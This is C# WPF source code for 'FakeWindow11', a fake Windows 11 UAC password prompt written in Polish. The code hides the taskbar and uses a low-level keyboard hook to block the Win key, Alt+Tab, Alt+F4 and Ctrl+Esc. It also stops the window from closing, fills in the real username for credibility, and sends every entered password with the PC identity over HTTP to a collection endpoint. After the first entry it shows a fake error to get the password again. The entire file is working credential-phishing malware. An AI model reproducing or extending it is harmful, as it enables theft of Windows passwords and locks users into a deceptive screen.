using System.ComponentModel;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows;
using System.Windows.Input;
using System.Diagnostics;
using System.Management;
using System.Windows.Media.Imaging;

namespace FakeWindow11
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
		[DllImport("user32.dll")] private static extern int FindWindow(string lpClassName, string lpWindowName);
		[DllImport("user32.dll")] private static extern int ShowWindow(int hwnd, int nCmdShow);
		[DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)] static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName);
		[DllImport("user32.dll")] private static extern short GetAsyncKeyState(int vKey);

		string[] data = { "icon.png", "program.exe", "Private Publisher", "C:/Users/User1/Downloads/program.exe" };

		/* Main Variables */
		private const int SW_HIDE = 0, SW_SHOW = 5, WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104, VK_LWIN = 0x5B, VK_RWIN = 0x5C, VK_TAB = 0x09, VK_ESCAPE = 0x1B, VK_CONTROL = 0x11, VK_MENU = 0x12, VK_SHIFT = 0x10, VK_F4 = 0x73, WM_COMMAND = 0x111, MIN_ALL = 419, MIN_ALL_UNDO = 416;
		private int lHwnd = FindWindow("Shell_TrayWnd", null);
		private bool close = false;
		private bool infoState = true;
		private int counter = 0;
		private static IntPtr _hookID = IntPtr.Zero;
		private static LowLevelKeyboardProc _proc = HookCallback;

		public MainWindow()
		{
			InitializeComponent();

			ShowWindow(lHwnd, SW_HIDE);
			SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
			_hookID = SetHook(_proc);
			this.Left = 0;
			this.Top = 0;
			this.WindowState = WindowState.Maximized;
			this.Topmost = true;
			this.Title = data[1] + " installer";
			this.Closing += onExit;
			name.Text = data[1];

			/* App setup */
			Username.Text = Environment.UserName;
			SystemUser.Text = Environment.MachineName + "\\" + Environment.UserName;
			ErrorMsg.Visibility = Visibility.Hidden;
			Password2.Visibility = Visibility.Collapsed;
			ToggleInfo();


			var uri = new Uri("./Images/" + data[0], UriKind.Relative);
			ProgramIcon.Source = new System.Windows.Media.Imaging.BitmapImage(uri);
		}
		private void ToggleInfo()
		{
			if (infoState)
			{
				Info.Text = "Zweryfikowany wydawca: " + data[1] + "\nPochodzenie pliku: Dysk twardy w tym komputerze";
				InfoButton.Text = "Pokaż więcej szczegółów";
				infoState = false;
			}
			else
			{
				Info.Text = $"Zweryfikowany wydawca: " + data[1] + "\nPochodzenie pliku: Dysk twardy w tym komputerze\nLokalizacja programu: " + data[3];
				InfoButton.Text = "Ukryj szczegóły";
				infoState = true;
			}
		}
		private void Check()
		{
			string password = Password.Password;
			if (counter >= 1)
			{
				SendData(password);
				Exit();
			}
			else
			{
				_ = SendData(password);
				Password.Password = "";
				Password2.Text = "";
				ErrorMsg.Visibility = Visibility.Visible;
				counter++;
			}
		}

		private async Task SendData(string pass)
		{

			HttpClient httpClient = new HttpClient();
			string key = Uri.EscapeDataString("API_KEY");
			string pc = Uri.EscapeDataString(WindowsIdentity.GetCurrent()?.Name ?? "Unknown");
			string passEnc = Uri.EscapeDataString(pass);

			string url = $"http://localhost:9876/api/send?key={key}&id=11&pc={pc}&pass={passEnc}";

			try
			{
				await httpClient.GetAsync(url);
			}
			catch (Exception ex) { }
		}

		/* Data Handling */

		/* Exit */
		private void Exit()
		{
			ShowWindow(lHwnd, SW_SHOW);
			SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
			close = true;
			UnhookWindowsHookEx(_hookID);
			Environment.Exit(0);
		}
		private void onExit(object sender, CancelEventArgs e)
		{
			if (!close)
			{
				e.Cancel = true;
			}
		}

		/* Buttons */
		private void PassShow(object sender, MouseEventArgs args)
		{
			Password2.Text = Password.Password;
			Password.Visibility = Visibility.Collapsed;
			Password2.Visibility = Visibility.Visible;
		}
		private void PassHide(object sender, MouseEventArgs args)
		{
			Password.Password = Password2.Text;
			Password.Visibility = Visibility.Visible;
			Password2.Visibility = Visibility.Collapsed;
		}
		private void PassSubmit(object sender, KeyEventArgs e)
		{
			if (e.Key == Key.Enter && Password.Visibility == Visibility.Visible)
			{
				Check();
			}
		}
		private void ToggleInfoBtn(object sender, MouseButtonEventArgs e)
		{
			ToggleInfo();
		}
		private void CancelBtn(object sender, EventArgs e)
		{
			Exit();
		}
		private void CheckBtn(object sender, EventArgs e)
		{
			Check();
		}
		private void CloseBtn(object sender, MouseButtonEventArgs e)
		{
			Exit();
		}


		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
		private static IntPtr SetHook(LowLevelKeyboardProc proc)
		{
			using (Process curProcess = Process.GetCurrentProcess())
			using (ProcessModule curModule = curProcess.MainModule)
			{
				return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
					GetModuleHandle(curModule.ModuleName), 0);
			}
		}
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
			{
				int vkCode = Marshal.ReadInt32(lParam);

				bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
				bool alt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
				bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

				if (vkCode == VK_LWIN || vkCode == VK_RWIN)
					return (IntPtr)1;

				if (alt && (vkCode == VK_TAB || vkCode == VK_F4))
					return (IntPtr)1;

				if (ctrl && ((vkCode == VK_ESCAPE) || (shift && vkCode == VK_ESCAPE)))
					return (IntPtr)1;
			}
			return CallNextHookEx(_hookID, nCode, wParam, lParam);
		}
	}
}